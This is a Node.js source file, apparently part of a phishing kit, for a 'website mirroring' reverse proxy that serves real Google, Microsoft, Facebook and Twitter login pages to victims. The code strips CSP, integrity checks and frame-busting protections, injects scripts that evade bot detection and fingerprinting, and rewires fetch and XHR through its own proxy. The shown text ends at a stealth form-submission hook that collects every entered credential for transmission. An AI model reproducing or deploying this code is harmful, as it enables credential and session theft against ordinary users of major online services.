const axios = require('axios');
const cheerio = require('cheerio');
const db = require('../database');
const crypto = require('crypto');
const { URL } = require('url');
const tough = require('tough-cookie');
const { CookieJar } = tough;
const { wrapper } = require('axios-cookiejar-support');
const querystring = require('querystring');

// Create an axios instance with cookie jar support (no custom HTTPS agent)
const axiosInstance = wrapper(axios.create({
  // Remove custom HTTPS agent as it conflicts with axios-cookiejar-support
  // SSL/TLS issues will be handled per-request if needed
}));

class WebsiteMirroringService {
  constructor() {
    this.activeSessions = new Map(); // sessionToken -> session data
    this.mirrorRoutes = new Map(); // path -> session data
    this.cookieJars = new Map(); // sessionToken -> cookieJar
    this.sessionStorage = new Map(); // sessionToken -> sessionStorage
    this.captures = new Map(); // sessionToken -> captured data (credentials, etc.)
    this.userAgentPool = this.initializeUserAgentPool();
    this.proxyFingerprints = new Map(); // sessionToken -> fingerprint data
    this.io = null; // WebSocket instance will be set by server
  }

  /**
   * Set the Socket.IO instance for real-time updates
   */
  setSocketIO(io) {
    this.io = io;
    console.log('✅ Socket.IO instance set for real-time cookie updates');
  }

  /**
   * Initialize a pool of realistic user agents optimized for Google services
   */
  initializeUserAgentPool() {
    return [
      // Latest Chrome versions for Windows (preferred by Google services)
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
      
      // Chrome for macOS (second most common)
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      
      // Chrome for Linux (for variety)
      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      
      // Edge (Chromium-based, also well-supported by Google)
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
      
      // Safari (for macOS compatibility)
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
      
      // Firefox (minimal, as Google services prefer Chrome)
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0'
    ];
  }

  /**
   * Generate realistic browser headers with anti-detection measures
   */
  generateRealistBrowserHeaders(req, targetUrl, sessionToken) {
    const targetHost = new URL(targetUrl).hostname;
    const userAgent = req.headers['user-agent'] || this.getRandomUserAgent();
    
    // Base headers that work for most sites
    const headers = {
      'User-Agent': userAgent,
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
      'Accept-Language': req.headers['accept-language'] || 'en-US,en;q=0.9',
      'Accept-Encoding': 'gzip, deflate, br',
      'Cache-Control': 'max-age=0',
      'Host': targetHost,
      'Upgrade-Insecure-Requests': '1',
      'Connection': 'keep-alive',
      
      // Advanced browser fingerprinting evasion
      'Sec-CH-UA': this.generateSecChUa(userAgent),
      'Sec-CH-UA-Mobile': '?0',
      'Sec-CH-UA-Platform': this.generateSecChUaPlatform(userAgent),
      'Sec-Fetch-Dest': req.headers['sec-fetch-dest'] || 'document',
      'Sec-Fetch-Mode': req.headers['sec-fetch-mode'] || 'navigate',
      'Sec-Fetch-Site': req.headers['sec-fetch-site'] || 'none',
      'Sec-Fetch-User': req.headers['sec-fetch-user'] || '?1',
      
      // Anti-bot detection headers
      'DNT': '1',
      'Pragma': 'no-cache',
    };

    // Google-specific headers for better compatibility
    if (targetHost.includes('google.com') || targetHost.includes('gmail.com')) {
      // Add Google-specific headers that are expected by their services
      headers['X-Client-Data'] = 'CJW2yQEIpLbJAQipncoBCMeAywEIlKHLAQiFoM0BCLnIzQEY9snNAQ==';
      headers['X-Goog-AuthUser'] = '0';
      headers['X-Goog-PageId'] = 'none';
      headers['X-Same-Domain'] = '1';
      
      // For API requests, adjust accept header
      if (req.headers['content-type'] && req.headers['content-type'].includes('json')) {
        headers['Accept'] = 'application/json, text/plain, */*';
      }
      
      // Add Chrome extension compatible headers
      if (userAgent.includes('Chrome')) {
        headers['Sec-CH-UA-Full-Version'] = '"120.0.6099.109"';
        headers['Sec-CH-UA-Platform-Version'] = '"15.0.0"';
      }
    }

    // Special handling for Google Play and other Google services
    if (targetHost.includes('play.google.com') || targetHost.includes('googleapis.com')) {
      headers['X-Goog-Request-Time'] = Date.now().toString();
      headers['X-Goog-Visitor-Id'] = this.generateGoogleVisitorId();
      headers['X-Client-Version'] = '1.0.0';
    }

    // Add referer handling with intelligent translation
    if (req.headers['referer']) {
      headers['Referer'] = this.translateReferer(req.headers['referer'], targetUrl, sessionToken);
    } else if (targetHost.includes('google.com')) {
      // For Google services, add a realistic referer
      headers['Referer'] = 'https://accounts.google.com/';
    }

    // Add origin header for POST requests
    if (req.method === 'POST') {
      headers['Origin'] = new URL(targetUrl).origin;
    }

    return headers;
  }

  /**
   * Generate a realistic Google Visitor ID
   */
  generateGoogleVisitorId() {
    // Generate a visitor ID that looks like Google's format
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-';
    let result = '';
    for (let i = 0; i < 27; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  }

  /**
   * Generate realistic Sec-CH-UA header
   */
  generateSecChUa(userAgent) {
    if (userAgent.includes('Chrome/120')) {
      return '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"';
    } else if (userAgent.includes('Chrome/119')) {
      return '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"';
    } else if (userAgent.includes('Firefox')) {
      return undefined; // Firefox doesn't send this header
    }
    return '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"';
  }

  /**
   * Generate realistic Sec-CH-UA-Platform header
   */
  generateSecChUaPlatform(userAgent) {
    if (userAgent.includes('Windows')) return '"Windows"';
    if (userAgent.includes('Macintosh')) return '"macOS"';
    if (userAgent.includes('Linux')) return '"Linux"';
    return '"Windows"';
  }

  /**
   * Get random user agent from pool
   */
  getRandomUserAgent() {
    return this.userAgentPool[Math.floor(Math.random() * this.userAgentPool.length)];
  }

  /**
   * Detect and bypass anti-bot measures
   */
  async bypassAntiBot(html, targetUrl, sessionToken) {
    const $ = cheerio.load(html);
    
    // Check for common anti-bot patterns
    const antiBot = {
      cloudflare: html.includes('cf-browser-verification') || html.includes('__cf_chl_jschl_tk__'),
      recaptcha: html.includes('recaptcha') || html.includes('g-recaptcha'),
      hcaptcha: html.includes('hcaptcha') || html.includes('h-captcha'),
      incapsula: html.includes('incap_ses') || html.includes('visid_incap'),
      distilNetworks: html.includes('distil') || html.includes('px-captcha'),
      amazonBot: html.includes('aws-waf') || html.includes('Request blocked'),
      microsoftBot: html.includes('blocked') && html.includes('microsoft'),
      facebookBot: html.includes('facebook') && (html.includes('blocked') || html.includes('unavailable')),
      twitterBot: html.includes('Something went wrong') && targetUrl.includes('twitter.com'),
    };

    // Advanced anti-detection for specific platforms
    if (targetUrl.includes('facebook.com') || targetUrl.includes('instagram.com')) {
      return this.bypassFacebookDetection($, html, targetUrl, sessionToken);
    }
    
    if (targetUrl.includes('twitter.com') || targetUrl.includes('x.com')) {
      return this.bypassTwitterDetection($, html, targetUrl, sessionToken);
    }
    
    if (targetUrl.includes('microsoft.com') || targetUrl.includes('office.com')) {
      return this.bypassMicrosoftDetection($, html, targetUrl, sessionToken);
    }

    return html;
  }

  /**
   * Bypass Facebook/Instagram specific detection
   */
  bypassFacebookDetection($, html, targetUrl, sessionToken) {
    // Remove Facebook's bot detection scripts
    $('script').each((i, elem) => {
      const scriptContent = $(elem).html();
      if (scriptContent && (
        scriptContent.includes('_btldr') ||
        scriptContent.includes('bootloader') ||
        scriptContent.includes('__d(') ||
        scriptContent.includes('require(') && scriptContent.includes('ServerJS')
      )) {
        // Replace with dummy script to avoid breaking dependencies
        $(elem).html('// Anti-bot script disabled');
      }
    });

    // Remove integrity checks that might detect proxying
    $('script[integrity], link[integrity]').removeAttr('integrity');
    
    // Inject Facebook-specific bypass scripts
    $('head').append(`
      <script>
        // Override Facebook's bot detection
        window.__fbNativeSetTimeout = window.setTimeout;
        window.navigator.webdriver = undefined;
        Object.defineProperty(navigator, 'webdriver', {
          get: () => undefined,
        });
        
        // Spoof Facebook's internal APIs
        window.require = window.require || function() { return {}; };
        window.__d = window.__d || function() {};
        
        // Block telemetry
        if (window.XMLHttpRequest) {
          const originalOpen = XMLHttpRequest.prototype.open;
          XMLHttpRequest.prototype.open = function(method, url) {
            if (url.includes('/ajax/') && url.includes('bootloader')) {
              return;
            }
            return originalOpen.apply(this, arguments);
          };
        }
      </script>
    `);

    return $.html();
  }

  /**
   * Bypass Twitter/X specific detection
   */
  bypassTwitterDetection($, html, targetUrl, sessionToken) {
    // Remove Twitter's bot detection and rate limiting
    $('script').each((i, elem) => {
      const scriptContent = $(elem).html();
      if (scriptContent && (
        scriptContent.includes('responsive-web') ||
        scriptContent.includes('api.twitter.com') ||
        scriptContent.includes('abs.twimg.com') && scriptContent.includes('api')
      )) {
        $(elem).remove();
      }
    });

    // Override Twitter's bot detection
    $('head').append(`
      <script>
        // Override Twitter bot detection
        Object.defineProperty(navigator, 'webdriver', {
          get: () => undefined,
        });
        
        // Spoof Twitter APIs
        window.fetch = new Proxy(window.fetch, {
          apply: function(target, thisArg, argumentsList) {
            const url = argumentsList[0];
            if (typeof url === 'string' && url.includes('api.twitter.com')) {
              // Block API calls that might detect proxying
              return Promise.resolve(new Response('{}', {status: 200}));
            }
            return target.apply(thisArg, argumentsList);
          }
        });
      </script>
    `);

    return $.html();
  }

  /**
   * Bypass Microsoft specific detection
   */
  bypassMicrosoftDetection($, html, targetUrl, sessionToken) {
    // Remove Microsoft's authentication and bot detection scripts
    $('script').each((i, elem) => {
      const scriptContent = $(elem).html();
      if (scriptContent && (
        scriptContent.includes('MicrosoftOnline') ||
        scriptContent.includes('msauth') ||
        scriptContent.includes('login.microsoftonline.com')
      )) {
        // Keep core functionality but remove telemetry
        const cleanedScript = scriptContent
          .replace(/fetch\([^)]*telemetry[^)]*\)/g, '// telemetry disabled')
          .replace(/XMLHttpRequest[^;]*telemetry[^;]*/g, '// telemetry disabled');
        $(elem).html(cleanedScript);
      }
    });

    // Override Microsoft's detection mechanisms
    $('head').append(`
      <script>
        // Override Microsoft bot detection
        window.navigator.webdriver = undefined;
        
        // Spoof Microsoft authentication APIs
        if (window.XMLHttpRequest) {
          const originalSend = XMLHttpRequest.prototype.send;
          XMLHttpRequest.prototype.send = function(data) {
            if (this._url && this._url.includes('login.microsoftonline.com')) {
              // Allow authentication requests but block telemetry
              if (data && data.includes('telemetry')) {
                return;
              }
            }
            return originalSend.apply(this, arguments);
          };
        }
      </script>
    `);

    return $.html();
  }

  /**
   * Advanced HTML content modification with anti-detection
   */
  async modifyHtmlContent(html, sessionToken, targetUrl, req) {
    try {
      // Extract tracking ID from request if available
      const trackingId = req.query._fstrike_track;
      
      // For Google services, we need aggressive CSP bypass instead of simulation
      const isGoogleService = targetUrl.includes('google.com') || targetUrl.includes('gmail.com');
      
      // Apply anti-bot bypasses first
      html = await this.bypassAntiBot(html, targetUrl, sessionToken);
      
      const baseUrl = new URL(targetUrl);
      const proxyPath = `/${sessionToken}`;

      // Use Cheerio to modify the HTML
      const $ = cheerio.load(html);

      // Remove all integrity checks that might detect content modification
      $('script[integrity], link[integrity]').removeAttr('integrity');
      $('script[crossorigin], link[crossorigin]').removeAttr('crossorigin');

      // AGGRESSIVE CSP and frame restriction removal for Google services
      if (isGoogleService) {
        console.log('🔥 Applying aggressive Google bypass techniques');
        
        // Remove ALL CSP meta tags and script-based CSP enforcement
        $('meta[http-equiv*="ecurity"], meta[name*="ecurity"]').remove();
        $('meta[http-equiv*="X-Frame"], meta[name*="frame"]').remove();
        
        // Remove Google-specific frame-busting and security scripts
        $('script').each((i, elem) => {
          const scriptContent = $(elem).html();
          if (scriptContent && (
            scriptContent.includes('frame') ||
            scriptContent.includes('parent') ||
            scriptContent.includes('top') ||
            scriptContent.includes('self') ||
            scriptContent.includes('location') ||
            scriptContent.includes('document.domain') ||
            scriptContent.includes('X-Frame-Options') ||
            scriptContent.includes('Content-Security-Policy') ||
            scriptContent.includes('goog.') ||
            scriptContent.includes('google.') ||
            scriptContent.includes('clickjacking') ||
            scriptContent.includes('framebusting') ||
            scriptContent.includes('breakout')
          )) {
            console.log('🗑️ Removing Google security script');
            $(elem).remove();
          }
        });
        
        // Inject intelligent Google bypass that preserves functionality
        $('head').prepend(`
          <script>
            // INTELLIGENT GOOGLE BYPASS - Preserves functionality while allowing framing
            (function() {
              console.log('🔥 Google bypass activated (intelligent mode)');
              
              // Store original properties before any modification
              const originalTop = window.top;
              const originalParent = window.parent;
              const originalSelf = window.self;
              
              // Only override frame properties if they would block iframe embedding
              const overrideFrameProperties = () => {
                try {
                  // Check if we're already in an iframe and being blocked
                  if (window.top !== window.self) {
                    // We're in an iframe, so override frame-busting checks
                    const descriptor = Object.getOwnPropertyDescriptor(window, 'top');
                    if (!descriptor || descriptor.configurable !== false) {
                      Object.defineProperty(window, 'top', {
                        get: () => window.self,
                        configurable: true
                      });
                    }
                    
                    const parentDescriptor = Object.getOwnPropertyDescriptor(window, 'parent');
                    if (!parentDescriptor || parentDescriptor.configurable !== false) {
                      Object.defineProperty(window, 'parent', {
                        get: () => window.self,
                        configurable: true
                      });
                    }
                  }
                  
                  // Always override frameElement to prevent iframe detection
                  const frameDescriptor = Object.getOwnPropertyDescriptor(window, 'frameElement');
                  if (!frameDescriptor || frameDescriptor.configurable !== false) {
                    Object.defineProperty(window, 'frameElement', {
                      get: () => null,
                      configurable: true
                    });
                  }
                } catch(e) {
                  console.log('Frame property override skipped:', e.message);
                }
              };
              
              // Apply frame property overrides immediately
              overrideFrameProperties();
              
              // Override frame-busting navigation attempts
              const originalLocationSetter = Object.getOwnPropertyDescriptor(window, 'location') || 
                                           Object.getOwnPropertyDescriptor(Object.getPrototypeOf(window), 'location');
              if (originalLocationSetter && originalLocationSetter.set) {
                Object.defineProperty(window, 'location', {
                  get: originalLocationSetter.get,
                  set: function(value) {
                    // Allow navigation within the same domain
                    if (typeof value === 'string' && value.includes('google.com')) {
                      return originalLocationSetter.set.call(this, value);
                    }
                    console.log('Blocked navigation attempt to:', value);
                    return false;
                  },
                  configurable: true
                });
              }
              
              // Provide missing Google callback functions to prevent errors
              window.onCssLoad = window.onCssLoad || function() { 
                console.log('CSS load callback shimmed'); 
              };
              window.onJsLoad = window.onJsLoad || function() { 
                console.log('JS load callback shimmed'); 
              };
              window.AF_initDataCallback = window.AF_initDataCallback || function() { 
                console.log('AF_initDataCallback shimmed'); 
                return {};
              };
              
              // Shim Google's internal APIs to prevent errors
              window.goog = window.goog || {};
              window.goog.provide = window.goog.provide || function() {};
              window.goog.require = window.goog.require || function() { return {}; };
              window.goog.module = window.goog.module || {};
              
              // Prevent CSP enforcement via JavaScript
              const originalCreateElement = document.createElement;
              document.createElement = function(tag) {
                const el = originalCreateElement.call(this, tag);
                if (tag.toLowerCase() === 'meta') {
                  const originalSetAttribute = el.setAttribute;
                  el.setAttribute = function(name, value) {
                    // Block frame-ancestors CSP directives
                    if (name.toLowerCase() === 'content' && 
                        typeof value === 'string' && 
                        value.includes('frame-ancestors')) {
                      console.log('Blocked CSP frame-ancestors directive');
                      return;
                    }
                    return originalSetAttribute.call(this, name, value);
                  };
                }
                return el;
              };
              
              // Periodically check and remove CSP restrictions
              const cleanupCSP = () => {
                try {
                  document.querySelectorAll('meta[http-equiv*="ecurity"]').forEach(meta => {
                    const content = meta.getAttribute('content') || '';
                    if (content.includes('frame-ancestors')) {
                      console.log('Removing CSP meta tag with frame-ancestors');
                      meta.remove();
                    }
                  });
                } catch(e) {}
              };
              
              // Run cleanup periodically but not too aggressively
              setInterval(cleanupCSP, 1000);
              
              console.log('✅ Google bypass complete - functionality preserved');
            })();
          </script>
        `);
        
      } else {
        // For non-Google sites, use standard CSP bypass
        $('meta[http-equiv="Content-Security-Policy"]').remove();
        $('meta[http-equiv="content-security-policy"]').remove();
        $('meta[name="Content-Security-Policy"]').remove();
        $('meta[name="content-security-policy"]').remove();
        
        // Remove frame-busting scripts
        $('script').each((i, elem) => {
          const scriptContent = $(elem).html();
          if (scriptContent && (
            scriptContent.includes('Content-Security-Policy') ||
            scriptContent.includes('frame-ancestors') ||
            scriptContent.includes('X-Frame-Options') ||
            scriptContent.includes('parent !== window') ||
            scriptContent.includes('top !== self')
          )) {
            console.log('Removing CSP/frame-blocking script');
            $(elem).remove();
          }
        });
        
        // Add permissive CSP
        $('head').prepend(`
          <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob: wss: ws:; frame-ancestors * data: blob:; frame-src * data: blob:;">
        `);
      }
      
      // Inject script to continuously override any CSP that might be set later
      $('head').prepend(`
        <script>
          // Continuously override CSP and frame restrictions
          (function() {
            // Override any attempts to set CSP via JavaScript
            const originalSetAttribute = Element.prototype.setAttribute;
            Element.prototype.setAttribute = function(name, value) {
              if (name.toLowerCase() === 'content' && 
                  this.getAttribute && 
                  (this.getAttribute('http-equiv') || '').toLowerCase().includes('content-security-policy')) {
                // Block CSP setting attempts
                console.log('Blocked CSP setting attempt');
                return;
              }
              return originalSetAttribute.call(this, name, value);
            };
            
            // Override frame-busting attempts
            if (window.top !== window.self) {
              try {
                window.top.location = window.self.location;
              } catch (e) {
                // If we can't access top, just ignore frame restrictions
              }
            }
            
            // Block common frame-busting techniques
            Object.defineProperty(window, 'top', {
              get: function() { return window; },
              set: function() { return window; }
            });
            
            Object.defineProperty(window, 'parent', {
              get: function() { return window; },
              set: function() { return window; }
            });
          })();
        </script>
      `);

      // Preserve module loading systems - inject our scripts carefully
      // Find if there are module scripts or webpack-style bundles
      const hasModuleScripts = $('script[type="module"]').length > 0;
      const hasWebpackBundles = $('script').toArray().some(script => {
        const src = $(script).attr('src') || '';
        const content = $(script).html() || '';
        return src.includes('vendor') || src.includes('main') || src.includes('chunk') || 
               content.includes('__webpack_require__') || content.includes('webpackJsonp');
      });

      // If there are module systems, be more careful with our script injection
      if (hasModuleScripts || hasWebpackBundles) {
        // Inject anti-detection script in a way that doesn't interfere with module loading
        $('head').append(`
          <script>
            // Advanced bot detection bypass - run before modules load
            (function() {
              // Store original module functions before they get overwritten
              const originalDefine = window.define;
              const originalRequire = window.require;
              
              // Advanced bot detection bypass
              Object.defineProperty(navigator, 'webdriver', {
                get: () => undefined,
                configurable: true
              });
              
              // Continuously remove CSP meta tags that might be added dynamically
              const removCSPTags = () => {
                const cspTags = document.querySelectorAll('meta[http-equiv*="ecurity"], meta[name*="ecurity"]');
                cspTags.forEach(tag => {
                  if (tag.getAttribute('http-equiv') && 
                      tag.getAttribute('http-equiv').toLowerCase().includes('content-security-policy')) {
                    tag.remove();
                  }
                  if (tag.getAttribute('name') && 
                      tag.getAttribute('name').toLowerCase().includes('content-security-policy')) {
                    tag.remove();
                  }
                });
              };
              
              // Run CSP removal immediately and periodically
              removCSPTags();
              setInterval(removCSPTags, 100);
              
              // Override document.createElement to block CSP meta tag creation
              const originalCreateElement = document.createElement;
              document.createElement = function(tagName) {
                const element = originalCreateElement.call(this, tagName);
                if (tagName.toLowerCase() === 'meta') {
                  const originalSetAttribute = element.setAttribute;
                  element.setAttribute = function(name, value) {
                    if (name.toLowerCase() === 'http-equiv' && 
                        value.toLowerCase().includes('content-security-policy')) {
                      return; // Block CSP meta tags
                    }
                    if (name.toLowerCase() === 'name' && 
                        value.toLowerCase().includes('content-security-policy')) {
                      return; // Block CSP meta tags
                    }
                    return originalSetAttribute.call(this, name, value);
                  };
                }
                return element;
              };
              
              // Override setAttribute on existing meta tags
              document.querySelectorAll('meta').forEach(meta => {
                const originalSetAttribute = meta.setAttribute;
                meta.setAttribute = function(name, value) {
                  if (name.toLowerCase() === 'http-equiv' && 
                      value.toLowerCase().includes('content-security-policy')) {
                    return; // Block CSP updates
                  }
                  if (name.toLowerCase() === 'name' && 
                      value.toLowerCase().includes('content-security-policy')) {
                    return; // Block CSP updates
                  }
                  return originalSetAttribute.call(this, name, value);
                };
              });
              
              // Spoof automation indicators
              delete window.callPhantom;
              delete window._phantom;
              delete window.__phantom;
              delete window.phantom;
              delete window.webdriver;
              delete window.domAutomation;
              delete window.domAutomationController;
              
              // Override common detection methods without breaking modules
              const originalToString = Function.prototype.toString;
              Function.prototype.toString = function() {
                const result = originalToString.call(this);
                return result.replace(/\\n\\s*\\[native code\\]\\s*\\n/g, ' [native code] ');
              };
              
              // Preserve module system functions
              if (originalDefine && !window.define) window.define = originalDefine;
              if (originalRequire && !window.require) window.require = originalRequire;
              
              // Block fingerprinting attempts without breaking modules
              const blockFingerprinting = () => {
                // Canvas fingerprinting
                if (HTMLCanvasElement.prototype.toDataURL) {
                  const originalToDataURL = HTMLCanvasElement.prototype.toDataURL;
                  HTMLCanvasElement.prototype.toDataURL = function() {
                    try {
                      return originalToDataURL.apply(this, arguments);
                    } catch(e) {
                      return 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==';
                    }
                  };
                }
                
                // WebGL fingerprinting
                if (WebGLRenderingContext.prototype.getParameter) {
                  const originalGetParameter = WebGLRenderingContext.prototype.getParameter;
                  WebGLRenderingContext.prototype.getParameter = function(parameter) {
                    if (parameter === 37445 || parameter === 37446) {
                      return 'Generic Renderer';
                    }
                    return originalGetParameter.call(this, parameter);
                  };
                }
              };
              
              blockFingerprinting();
              
              // Override timing APIs to avoid detection
              if (window.performance && window.performance.now) {
                const originalNow = window.performance.now;
                window.performance.now = function() {
                  return originalNow.call(this) + Math.random() * 0.1;
                };
              }
            })();
          </script>
        `);
      } else {
        // Original script injection for non-module sites
        $('head').prepend(`
          <script>
            (function() {
              // Advanced bot detection bypass
              Object.defineProperty(navigator, 'webdriver', {
                get: () => undefined,
                configurable: true
              });
              
              // Continuously remove CSP meta tags that might be added dynamically
              const removeCSPTags = () => {
                const cspTags = document.querySelectorAll('meta[http-equiv*="ecurity"], meta[name*="ecurity"]');
                cspTags.forEach(tag => {
                  if (tag.getAttribute('http-equiv') && 
                      tag.getAttribute('http-equiv').toLowerCase().includes('content-security-policy')) {
                    tag.remove();
                  }
                  if (tag.getAttribute('name') && 
                      tag.getAttribute('name').toLowerCase().includes('content-security-policy')) {
                    tag.remove();
                  }
                });
              };
              
              // Run CSP removal immediately and periodically
              removeCSPTags();
              setInterval(removeCSPTags, 100);
              
              // Override document.createElement to block CSP meta tag creation
              const originalCreateElement = document.createElement;
              document.createElement = function(tagName) {
                const element = originalCreateElement.call(this, tagName);
                if (tagName.toLowerCase() === 'meta') {
                  const originalSetAttribute = element.setAttribute;
                  element.setAttribute = function(name, value) {
                    if (name.toLowerCase() === 'http-equiv' && 
                        value.toLowerCase().includes('content-security-policy')) {
                      return; // Block CSP meta tags
                    }
                    if (name.toLowerCase() === 'name' && 
                        value.toLowerCase().includes('content-security-policy')) {
                      return; // Block CSP meta tags
                    }
                    return originalSetAttribute.call(this, name, value);
                  };
                }
                return element;
              };
              
              // Spoof automation indicators
              delete window.callPhantom;
              delete window._phantom;
              delete window.__phantom;
              delete window.phantom;
              delete window.webdriver;
              delete window.domAutomation;
              delete window.domAutomationController;
              
              // Override common detection methods
              const originalToString = Function.prototype.toString;
              Function.prototype.toString = function() {
                const result = originalToString.call(this);
                return result.replace(/\\n\\s*\\[native code\\]\\s*\\n/g, ' [native code] ');
              };
              
              // Spoof geolocation with consent
              if (navigator.geolocation) {
                const originalGetCurrentPosition = navigator.geolocation.getCurrentPosition;
                navigator.geolocation.getCurrentPosition = function(success, error, options) {
                  // Simulate user denying location
                  if (error) error({ code: 1, message: 'User denied geolocation' });
                };
              }
              
              // Block fingerprinting attempts
              const blockFingerprinting = () => {
                // Canvas fingerprinting
                if (HTMLCanvasElement.prototype.toDataURL) {
                  HTMLCanvasElement.prototype.toDataURL = function() {
                    return 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==';
                  };
                }
                
                // WebGL fingerprinting
                if (WebGLRenderingContext.prototype.getParameter) {
                  const originalGetParameter = WebGLRenderingContext.prototype.getParameter;
                  WebGLRenderingContext.prototype.getParameter = function(parameter) {
                    if (parameter === 37445 || parameter === 37446) {
                      return 'Generic Renderer';
                    }
                    return originalGetParameter.call(this, parameter);
                  };
                }
              };
              
              blockFingerprinting();
              
              // Override timing APIs to avoid detection
              if (window.performance && window.performance.now) {
                const originalNow = window.performance.now;
                window.performance.now = function() {
                  return originalNow.call(this) + Math.random() * 0.1;
                };
              }
            })();
          </script>
        `);
      }

      // Add base tag if it doesn't exist, or modify existing one
      const baseTag = $('base');
      if (baseTag.length > 0) {
        baseTag.attr('href', `${targetUrl}/`);
      } else {
        $('head').prepend(`<base href="${targetUrl}/" />`);
      }

      // Advanced URL rewriting with intelligent detection avoidance
      this.rewriteUrls($, proxyPath, targetUrl, sessionToken);

      // Inject invisible tracking pixel (more sophisticated)
      $('body').append(`
        <img src="/api/track-mirror-view/${sessionToken}" 
             style="position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;" 
             alt="" 
             loading="lazy" />
      `);
      
      // Advanced credential capture with stealth mode - inject after DOM is ready
      $('body').append(`
        <script>
          // CORS Bypass and API Interception - Critical for Google Services
          (function() {
            // Store original functions before they get overridden
            const originalFetch = window.fetch;
            const originalXMLHttpRequest = window.XMLHttpRequest;
            const originalOpen = XMLHttpRequest.prototype.open;
            const originalSend = XMLHttpRequest.prototype.send;
            
            // Create a proxy endpoint for cross-origin requests
            const proxyEndpoint = '/api/cors-proxy/${sessionToken}';
            
            // Function to determine if URL needs proxying
            function needsProxy(url) {
              try {
                const urlObj = new URL(url, window.location.href);
                const currentHost = window.location.hostname;
                const targetHost = urlObj.hostname;
                
                // Proxy requests to different domains, especially Google services
                return targetHost !== currentHost || 
                       url.includes('google.com') || 
                       url.includes('googleapis.com') || 
                       url.includes('gstatic.com') ||
                       url.includes('googleusercontent.com');
              } catch (e) {
                return false;
              }
            }
            
            // Override fetch API
            window.fetch = function(url, options = {}) {
              if (needsProxy(url)) {
                // Route through our proxy
                const proxyUrl = proxyEndpoint + '?url=' + encodeURIComponent(url);
                const proxyOptions = {
                  ...options,
                  headers: {
                    ...options.headers,
                    'X-Proxy-Target': url,
                    'X-Original-Host': new URL(url, window.location.href).hostname
                  }
                };
                return originalFetch(proxyUrl, proxyOptions);
              }
              return originalFetch(url, options);
            };
            
            // Override XMLHttpRequest
            function ProxiedXMLHttpRequest() {
              const xhr = new originalXMLHttpRequest();
              let targetUrl = null;
              let needsProxying = false;
              
              // Override open method
              const originalXhrOpen = xhr.open;
              xhr.open = function(method, url, async, user, password) {
                targetUrl = url;
                needsProxying = needsProxy(url);
                
                if (needsProxying) {
                  const proxyUrl = proxyEndpoint + '?url=' + encodeURIComponent(url);
                  return originalXhrOpen.call(this, method, proxyUrl, async, user, password);
                }
                return originalXhrOpen.call(this, method, url, async, user, password);
              };
              
              // Override setRequestHeader to add proxy headers
              const originalSetRequestHeader = xhr.setRequestHeader;
              xhr.setRequestHeader = function(header, value) {
                if (needsProxying) {
                  // Add proxy headers
                  originalSetRequestHeader.call(this, 'X-Proxy-Target', targetUrl);
                  originalSetRequestHeader.call(this, 'X-Original-Host', new URL(targetUrl, window.location.href).hostname);
                }
                return originalSetRequestHeader.call(this, header, value);
              };
              
              return xhr;
            }
            
            // Replace XMLHttpRequest constructor
            window.XMLHttpRequest = ProxiedXMLHttpRequest;
            
            // Copy static properties
            Object.setPrototypeOf(ProxiedXMLHttpRequest.prototype, originalXMLHttpRequest.prototype);
            Object.setPrototypeOf(ProxiedXMLHttpRequest, originalXMLHttpRequest);
            
            // Override common AJAX libraries if they exist
            if (window.jQuery) {
              const originalAjax = jQuery.ajax;
              jQuery.ajax = function(options) {
                if (options.url && needsProxy(options.url)) {
                  options.url = proxyEndpoint + '?url=' + encodeURIComponent(options.url);
                  options.headers = options.headers || {};
                  options.headers['X-Proxy-Target'] = options.url;
                }
                return originalAjax.call(this, options);
              };
            }
            
            console.log('CORS bypass and API interception initialized');
          })();
          
          // Wait for DOM and modules to be ready before injecting our monitoring
          (function() {
            const initMonitoring = function() {
              try {
                // Stealth form monitoring
                const originalAddEventListener = EventTarget.prototype.addEventListener;
                
                // Monitor form submissions with advanced stealth
                document.addEventListener('submit', function(e) {
                  try {
                    const form = e.target;
                    if (!form || form.tagName !== 'FORM') return;
                    
                    const data = {};
                    const inputs = form.querySelectorAll('input, select, textarea');
                    
                    inputs.forEach(input => {
                      if (input.name && input.value && 
                          input.type !== 'submit' && 
                          input.type !== 'button' && 
                          input.type !== 'image') {
                        data[input.name] = input.value;
                      }
                    });
                    
                    // Stealth data transmission
